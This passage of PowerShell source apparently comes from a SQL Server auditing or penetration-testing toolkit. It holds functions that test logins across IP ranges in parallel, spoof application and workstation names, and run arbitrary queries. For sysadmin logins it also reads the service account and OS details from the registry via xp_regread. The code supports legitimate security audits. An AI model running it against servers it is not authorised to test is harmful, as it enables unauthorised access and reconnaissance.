#requires -version 2
Function Get-SQLConnectionObject
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Dedicated Administrator Connection (DAC).')]
        [Switch]$DAC,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Default database to connect to.')]
        [String]$Database,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Spoof the name of the application your connecting to the server with.')]
        [string]$AppName = "",

        [Parameter(Mandatory = $false,
        HelpMessage = 'Spoof the name of the workstation/hostname your connecting to the server with.')]
        [string]$WorkstationId = "",

        [Parameter(Mandatory = $false,
        HelpMessage = 'Use an encrypted connection.')]
        [ValidateSet("Yes","No","")]
        [string]$Encrypt = "",

        [Parameter(Mandatory = $false,
        HelpMessage = 'Trust the certificate of the remote server.')]
        [ValidateSet("Yes","No","")]
        [string]$TrustServerCert = "",

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$TimeOut = 1
    )

    Begin
    {
        # Setup DAC string
        if($DAC)
        {
            $DacConn = 'ADMIN:'
        }
        else
        {
            $DacConn = ''
        }

        # Set database filter
        if(-not $Database)
        {
            $Database = 'Master'
        }

        # Check if appname was provided
        if($AppName){
            $AppNameString = ";Application Name=`"$AppName`""
        }else{
            $AppNameString = ""
        }

        # Check if workstationid was provided
        if($WorkstationId){
            $WorkstationString = ";Workstation Id=`"$WorkstationId`""
        }else{
            $WorkstationString = ""
        }

        # Check if encrypt was provided
        if($Encrypt){
            $EncryptString = ";Encrypt=Yes"
        }else{
            $EncryptString = ""
        }

        # Check TrustServerCert was provided
        if($TrustServerCert){
            $TrustCertString = ";TrustServerCertificate=Yes"
        }else{
            $TrustCertString = ""
        }
    }

    Process
    {
        # Check for instance
        if ( -not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Create connection object
        $Connection = New-Object -TypeName System.Data.SqlClient.SqlConnection

        # Set authentcation type - current windows user
        if(-not $Username){

            # Set authentication type
            $AuthenticationType = "Current Windows Credentials"

            # Set connection string
            $Connection.ConnectionString = "Server=$DacConn$Instance;Database=$Database;Integrated Security=SSPI;Connection Timeout=$TimeOut$AppNameString$EncryptString$TrustCertString$WorkstationString"
        }
        
        # Set authentcation type - provided windows user
        if ($username -like "*\*"){
            $AuthenticationType = "Provided Windows Credentials"

            # Setup connection string 
            $Connection.ConnectionString = "Server=$DacConn$Instance;Database=$Database;Integrated Security=SSPI;uid=$Username;pwd=$Password;Connection Timeout=$TimeOut$AppNameString$EncryptString$TrustCertString$WorkstationString"
        }

        # Set authentcation type - provided sql login
        if (($username) -and ($username -notlike "*\*")){

            # Set authentication type
            $AuthenticationType = "Provided SQL Login"

            # Setup connection string 
            $Connection.ConnectionString = "Server=$DacConn$Instance;Database=$Database;User ID=$Username;Password=$Password;Connection Timeout=$TimeOut$AppNameString$EncryptString$TrustCertString$WorkstationString"
        }

        # Return the connection object
        return $Connection
    }

    End
    {
    }
}

Function  Get-SQLConnectionTest
{
    <#
            .SYNOPSIS
            Tests if the current Windows account or provided SQL Server login can log into an SQL Server.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DAC
            Connect using Dedicated Admin Connection.
            .PARAMETER Database
            Default database to connect to.
            .PARAMETER TimeOut
            Connection time out.
            .PARAMETER SuppressVerbose
            Suppress verbose errors.  Used when function is wrapped.
            .EXAMPLE
            PS C:\> Get-SQLConnectionTest -Verbose -Instance "SQLSERVER1.domain.com\SQLExpress"
            .EXAMPLE
            PS C:\> Get-SQLConnectionTest -Verbose -Instance "SQLSERVER1.domain.com,1433"
            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain | Get-SQLConnectionTest -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
            ValueFromPipeline = $true,
            ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'IP Address of SQL Server.')]
        [string]$IPAddress,

        [Parameter(Mandatory = $false,
        HelpMessage = 'IP Address Range In CIDR Format to Audit.')]
        [string]$IPRange,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$DAC,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Default database to connect to.')]
        [String]$Database,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$TimeOut,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Setup data table for output
        $TblResults = New-Object -TypeName System.Data.DataTable
        $null = $TblResults.Columns.Add('ComputerName')
        $null = $TblResults.Columns.Add('Instance')
        $null = $TblResults.Columns.Add('Status')
    }

    Process
    {
        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        # Split Demarkation Start ^
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        if($IPRange -and $IPAddress)
        {
            if ($IPAddress.Contains(","))
            {
                $ContainsValid = $false
                foreach ($IP in $IPAddress.Split(","))
                {
                    if($(Test-Subnet -cidr $IPRange -ip $IP))
                    {
                        $ContainsValid = $true
                    }
                }
                if (-not $ContainsValid)
                {
                    Write-Warning "Skipping $ComputerName ($IPAddress)"
                    $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Out of Scope')
                    return
                }
            }

            if(-not $(Test-Subnet -cidr $IPRange -ip $IPAddress))
            {
                Write-Warning "Skipping $ComputerName ($IPAddress)"
                $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Out of Scope')
                return
            }
            Write-Verbose "$ComputerName ($IPAddress)"
        }

        # Setup DAC string
        if($DAC)
        {
            # Create connection object
            $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut -Database $Database
        }
        else
        {
            # Create connection object
            $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut -Database $Database
        }

        # Attempt connection
        try
        {
            # Open connection
            $Connection.Open()

            if(-not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }

            # Add record
            $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Accessible')

            # Close connection
            $Connection.Close()

            # Dispose connection
            $Connection.Dispose()
        }
        catch
        {
            # Connection failed
            if(-not $SuppressVerbose)
            {
                $ErrorMessage = $_.Exception.Message
                Write-Verbose -Message "$Instance : Connection Failed."
                Write-Verbose  -Message " Error: $ErrorMessage"
            }

            # Add record
            $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Not Accessible')
        }
    }

    End
    {
        # Return Results
        $TblResults
    }
}

Function  Get-SQLConnectionTestThreaded
{
    <#
            .SYNOPSIS
            Tests if the current Windows account or provided SQL Server login can log into an SQL Server.  This version support threading using runspaces.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DAC
            Connect using Dedicated Admin Connection.
            .PARAMETER Database
            Default database to connect to.
            .PARAMETER TimeOut
            Connection time out.
            .PARAMETER SuppressVerbose
            Suppress verbose errors.  Used when function is wrapped.
            .PARAMETER Threads
            Number of concurrent threads.
            .EXAMPLE
            PS C:\> Get-SQLConnectionTestThreaded -Verbose -Instance "SQLSERVER1.domain.com\SQLExpress" -Threads 15
            .EXAMPLE
            PS C:\> Get-SQLConnectionTestThreaded -Verbose -Instance "SQLSERVER1.domain.com,1433" -Threads 15
            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose -Threads 15
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
            ValueFromPipeline = $true,
            ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'IP Address of SQL Server.')]
        [string]$IPAddress,

        [Parameter(Mandatory = $false,
        HelpMessage = 'IP Address Range In CIDR Format to Audit.')]
        [string]$IPRange,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$DAC,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Default database to connect to.')]
        [String]$Database,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$TimeOut,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$Threads = 5,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Setup data table for output
        $TblResults = New-Object -TypeName System.Data.DataTable
        $null = $TblResults.Columns.Add('ComputerName')
        $null = $TblResults.Columns.Add('Instance')
        $null = $TblResults.Columns.Add('Status')

        # Setup data table for pipeline threading
        $PipelineItems = New-Object -TypeName System.Data.DataTable

        # set instance to local host by default
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Ensure provided instance is processed
        if($Instance)
        {
            $ProvideInstance = New-Object -TypeName PSObject -Property @{
                Instance = $Instance;
            }
        }

        if($Instance -and $IPAddress)
        {
            $ProvideInstance | Add-Member -Name "IPAddress" -Value $IPAddress
        }

        # Add instance to instance list
        $PipelineItems = $PipelineItems + $ProvideInstance
    }

    Process
    {
        # Create list of pipeline items
        $PipelineItems = $PipelineItems + $_
    }

    End
    {
        # Define code to be multi-threaded
        $MyScriptBlock = {
            # Setup instance
            $Instance = $_.Instance
            $IPAddress = $_.IPAddress

            # Parse computer name from the instance
            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

            if($IPRange -and $IPAddress)
            {
                if ($IPAddress.Contains(","))
                {
                    $ContainsValid = $false
                    foreach ($IP in $IPAddress.Split(","))
                    {
                        if($(Test-Subnet -cidr $IPRange -ip $IP))
                        {
                            $ContainsValid = $true
                        }
                    }
                    if (-not $ContainsValid)
                    {
                        Write-Warning "Skipping $ComputerName ($IPAddress)"
                        $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Out of Scope')
                        return
                    }
                }

                if(-not $(Test-Subnet -cidr $IPRange -ip $IPAddress))
                {
                    Write-Warning "Skipping $ComputerName ($IPAddress)"
                    $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Out of Scope')
                    return
                }
                Write-Verbose "$ComputerName ($IPAddress)"
            }

            # Setup DAC string
            if($DAC)
            {
                # Create connection object
                $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut -Database $Database
            }
            else
            {
                # Create connection object
                $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut -Database $Database
            }

            # Attempt connection
            try
            {
                # Open connection
                $Connection.Open()

                if(-not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : Connection Success."
                }

                # Add record
                $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Accessible')

                # Close connection
                $Connection.Close()

                # Dispose connection
                $Connection.Dispose()
            }
            catch
            {
                # Connection failed

                if(-not $SuppressVerbose)
                {
                    $ErrorMessage = $_.Exception.Message
                    Write-Verbose -Message "$Instance : Connection Failed."
                    #Write-Verbose  " Error: $ErrorMessage"
                }

                # Add record
                $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Not Accessible')
            }
        }

        # Run scriptblock using multi-threading
        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue

        return $TblResults
    }
}

Function Get-SQLQuery
{
    <#
            .SYNOPSIS
            Executes a query on target SQL servers.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DAC
            Connect using Dedicated Admin Connection.
            .PARAMETER Database
            Default database to connect to.
            .PARAMETER TimeOut
            Connection time out.
            .PARAMETER SuppressVerbose
            Suppress verbose errors.  Used when function is wrapped.
            .PARAMETER Threads
            Number of concurrent threads.
            .PARAMETER Query
            Query to be executed on the SQL Server.
            .PARAMETER AppName
            Spoof the name of the application you are connecting to SQL Server with.
            .PARAMETER WorkstationId
            Spoof the name of the workstation/hostname you are connecting to SQL Server with.
            .PARAMETER Encrypt
            Use an encrypted connection.
            .PARAMETER TrustServerCert
            Trust the certificate of the remote server.
            .EXAMPLE
            PS C:\> Get-SQLQuery -Verbose -Instance "SQLSERVER1.domain.com\SQLExpress" -Query "Select @@version" -Threads 15
            .EXAMPLE
            PS C:\> Get-SQLQuery -Verbose -Instance "SQLSERVER1.domain.com,1433" -Query "Select @@version" -Threads 15
            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain | Get-SQLQuery -Verbose -Query "Select @@version" -Threads 15
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server query.')]
        [string]$Query,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$DAC,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Default database to connect to.')]
        [String]$Database,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [int]$TimeOut,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Spoof the name of the application your connecting to the server with.')]
        [string]$AppName = "",

        [Parameter(Mandatory = $false,
        HelpMessage = 'Spoof the name of the workstation/hostname your connecting to the server with.')]
        [string]$WorkstationId = "",

        [Parameter(Mandatory = $false,
        HelpMessage = 'Use an encrypted connection.')]
        [ValidateSet("Yes","No","")]
        [string]$Encrypt = "",

        [Parameter(Mandatory = $false,
        HelpMessage = 'Trust the certificate of the remote server.')]
        [ValidateSet("Yes","No","")]
        [string]$TrustServerCert = "",

        [Parameter(Mandatory = $false,
        HelpMessage = 'Return error message if exists.')]
        [switch]$ReturnError
    )

    Begin
    {
        # Setup up data tables for output
        $TblQueryResults = New-Object -TypeName System.Data.DataTable
    }

    Process
    {
        # Setup DAC string
        if($DAC)
        {
            # Create connection object
            $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut -DAC -Database $Database -AppName $AppName -WorkstationId $WorkstationId -Encrypt $Encrypt -TrustServerCert $TrustServerCert
        }
        else
        {
            # Create connection object
            $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut -Database $Database -AppName $AppName -WorkstationId $WorkstationId -Encrypt $Encrypt -TrustServerCert $TrustServerCert
        }

        # Parse SQL Server instance name
        $ConnectionString = $Connection.Connectionstring
        $Instance = $ConnectionString.split(';')[0].split('=')[1]

        # Check for query
        if($Query)
        {
            # Attempt connection
            try
            {
                # Open connection
                $Connection.Open()

                if(-not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : Connection Success."
                }

                # Setup SQL query
                $Command = New-Object -TypeName System.Data.SqlClient.SqlCommand -ArgumentList ($Query, $Connection)

                # Grab results
                $Results = $Command.ExecuteReader()

                # Load results into data table
                $TblQueryResults.Load($Results)

                # Close connection
                $Connection.Close()

                # Dispose connection
                $Connection.Dispose()
            }
            catch
            {
                # Connection failed - for detail error use  Get-SQLConnectionTest
                if(-not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : Connection Failed."
                }

                if($ReturnError)
                {
                    $ErrorMessage = $_.Exception.Message
                    #Write-Verbose  " Error: $ErrorMessage"
                }
            }
        }
        else
        {
            Write-Output -InputObject 'No query provided to Get-SQLQuery function.'
            Break
        }
    }

    End
    {
        # Return Results
        if($ReturnError)
        {
            $ErrorMessage
        }
        else
        {
            $TblQueryResults
        }
    }
}

Function  Get-SQLQueryThreaded
{
    <#
            .SYNOPSIS
            Executes a query on target SQL servers.This version support threading using runspaces.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DAC
            Connect using Dedicated Admin Connection.
            .PARAMETER Database
            Default database to connect to.
            .PARAMETER TimeOut
            Connection time out.
            .PARAMETER SuppressVerbose
            Suppress verbose errors.  Used when function is wrapped.
            .PARAMETER Threads
            Number of concurrent host threads.
            .PARAMETER Query
            Query to be executed on the SQL Server.
            .EXAMPLE
            PS C:\> Get-SQLQueryThreaded -Verbose -Instance "SQLSERVER1.domain.com\SQLExpress" -Query "Select @@version" -Threads 15
            .EXAMPLE
            PS C:\> Get-SQLQueryThreaded -Verbose -Instance "SQLSERVER1.domain.com,1433" -Query "Select @@version" -Threads 15
            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain | Get-SQLQueryThreaded -Verbose -Query "Select @@version" -Threads 15
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$DAC,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Default database to connect to.')]
        [String]$Database,

        [Parameter(Mandatory = $true,
        HelpMessage = 'Query to be executed.')]
        [String]$Query,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$TimeOut,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$Threads = 5,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Setup data table for output
        $TblResults = New-Object -TypeName System.Data.DataTable

        # Setup data table for pipeline threading
        $PipelineItems = New-Object -TypeName System.Data.DataTable

        # set instance to local host by default
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Ensure provided instance is processed
        if($Instance)
        {
            $ProvideInstance = New-Object -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }

        # Add instance to instance list
        $PipelineItems = $PipelineItems + $ProvideInstance
    }

    Process
    {
        # Create list of pipeline items
        $PipelineItems = $PipelineItems + $_
    }

    End
    {
        # Define code to be multi-threaded
        $MyScriptBlock = {
            $Instance = $_.Instance

            # Parse computer name from the instance
            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

            # Setup DAC string
            if($DAC)
            {
                # Create connection object
                $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut -Database $Database
            }
            else
            {
                # Create connection object
                $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut -Database $Database
            }

            # Attempt connection
            try
            {
                # Open connection
                $Connection.Open()

                if(-not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : Connection Success."
                }

                # Setup SQL query
                $Command = New-Object -TypeName System.Data.SqlClient.SqlCommand -ArgumentList ($Query, $Connection)

                # Grab results
                $Results = $Command.ExecuteReader()

                # Load results into data table
                $TblResults.Load($Results)

                # Close connection
                $Connection.Close()

                # Dispose connection
                $Connection.Dispose()
            }
            catch
            {
                # Connection failed

                if(-not $SuppressVerbose)
                {
                    $ErrorMessage = $_.Exception.Message
                    Write-Verbose -Message "$Instance : Connection Failed."
                    #Write-Verbose  " Error: $ErrorMessage"
                }

                # Add record
                $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Not Accessible')
            }
        }

        # Run scriptblock using multi-threading
        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue

        return $TblResults
    }
}

Function  Get-SQLServerInfo
{
    <#
            .SYNOPSIS
            Returns basic server and user information from target SQL Servers.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .EXAMPLE
            PS C:\> Get-SQLServerInfo -Instance SQLServer1\STANDARDDEV2014

            ComputerName           : SQLServer1
            Instance               : SQLServer1\STANDARDDEV2014
            DomainName             : Domain
            ServiceProcessId       : 6758
            ServiceName            : MSSQL$STANDARDDEV2014
            ServiceAccount         : LocalSystem
            AuthenticationMode     : Windows and SQL Server Authentication
            Clustered              : No
            SQLServerVersionNumber : 12.0.4213.0
            SQLServerMajorVersion  : 2014
            SQLServerEdition       : Developer Edition (64-bit)
            SQLServerServicePack   : SP1
            OSArchitecture         : X64
            OsMachineType          : WinNT
            OSVersionName          : Windows 8.1 Pro
            OsVersionNumber        : 6.3
            Currentlogin           : Domain\MyUser
            IsSysadmin             : Yes
            ActiveSessions         : 1
            .EXAMPLE
            PS C:\> Get-SQLInstanceLocal | Get-SQLServerInfo -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblServerInfo = New-Object -TypeName System.Data.DataTable
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Get number of active sessions for server
        $ActiveSessions = Get-SQLSession -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose |
        Where-Object -FilterScript {
            $_.SessionStatus -eq 'running'
        } |
        Measure-Object -Line |
        Select-Object -Property Lines -ExpandProperty Lines

        # Get sysadmin status
        $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin

        if($IsSysadmin -eq 'Yes')
        {
            # Grab additional information if sysadmin
            $SysadminSetup = "
                -- Get machine type
                DECLARE @MachineType  SYSNAME
                EXECUTE master.dbo.xp_regread
                @rootkey		= N'HKEY_LOCAL_MACHINE',
                @key			= N'SYSTEM\CurrentControlSet\Control\ProductOptions',
                @value_name		= N'ProductType',
                @value			= @MachineType output

                -- Get OS version
                DECLARE @ProductName  SYSNAME
                EXECUTE master.dbo.xp_regread
                @rootkey		= N'HKEY_LOCAL_MACHINE',
                @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion',
                @value_name		= N'ProductName',
            @value			= @ProductName output"

            $SysadminQuery = '  @MachineType as [OsMachineType],
            @ProductName as [OSVersionName],'
        }
        else
        {
            $SysadminSetup = ''
            $SysadminQuery = ''
        }

        # Define Query
        $Query = "  -- Get SQL Server Information

            -- Get SQL Server Service Name and Path
            DECLARE @SQLServerInstance varchar(250)
            DECLARE @SQLServerServiceName varchar(250)
            if @@SERVICENAME = 'MSSQLSERVER'
            BEGIN
            set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQLSERVER'
            set @SQLServerServiceName = 'MSSQLSERVER'
            END
            ELSE
            BEGIN
            set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQL$'+cast(@@SERVICENAME as varchar(250))
            set @SQLServerServiceName = 'MSSQL$'+cast(@@SERVICENAME as varchar(250))
            END

            -- Get SQL Server Service Account
            DECLARE @ServiceaccountName varchar(250)
            EXECUTE master.dbo.xp_instance_regread
            N'HKEY_LOCAL_MACHINE', @SQLServerInstance,
            N'ObjectName',@ServiceAccountName OUTPUT, N'no_output'

            -- Get authentication mode
            DECLARE @AuthenticationMode INT
            EXEC master.dbo.xp_instance_regread N'HKEY_LOCAL_MACHINE',
            N'Software\Microsoft\MSSQLServer\MSSQLServer',
            N'LoginMode', @AuthenticationMode OUTPUT

            -- Get the forced encryption flag
            BEGIN TRY 
	            DECLARE @ForcedEncryption INT
	            EXEC master.dbo.xp_instance_regread N'HKEY_LOCAL_MACHINE',
	            N'SOFTWARE\MICROSOFT\Microsoft SQL Server\MSSQLServer\SuperSocketNetLib',
	            N'ForceEncryption', @ForcedEncryption OUTPUT
            END TRY
            BEGIN CATCH	            
            END CATCH

            -- Grab additional information as sysadmin
            $SysadminSetup

            -- Return server and version information
            SELECT  '$ComputerName' as [ComputerName],
            @@servername as [Instance],
            DEFAULT_DOMAIN() as [DomainName],
            SERVERPROPERTY('processid') as ServiceProcessID,
            @SQLServerServiceName as [ServiceName],
            @ServiceAccountName as [ServiceAccount],
            (SELECT CASE @AuthenticationMode
            WHEN 1 THEN 'Windows Authentication'
            WHEN 2 THEN 'Windows and SQL Server Authentication'
            ELSE 'Unknown'
            END) as [AuthenticationMode],
            @ForcedEncryption as ForcedEncryption,
            CASE  SERVERPROPERTY('IsClustered')
            WHEN 0
            THEN 'No'
            ELSE 'Yes'
            END as [Clustered],
            SERVERPROPERTY('productversion') as [SQLServerVersionNumber],
            SUBSTRING(@@VERSION, CHARINDEX('2', @@VERSION), 4) as [SQLServerMajorVersion],
            serverproperty('Edition') as [SQLServerEdition],
            SERVERPROPERTY('ProductLevel') AS [SQLServerServicePack],
            SUBSTRING(@@VERSION, CHARINDEX('x', @@VERSION), 3) as [OSArchitecture],
            $SysadminQuery
            RIGHT(SUBSTRING(@@VERSION, CHARINDEX('Windows NT', @@VERSION), 14), 3) as [OsVersionNumber],
            SYSTEM_USER as [Currentlogin],
            '$IsSysadmin' as [IsSysadmin],
        '$ActiveSessions' as [ActiveSessions]"
        # Execute Query
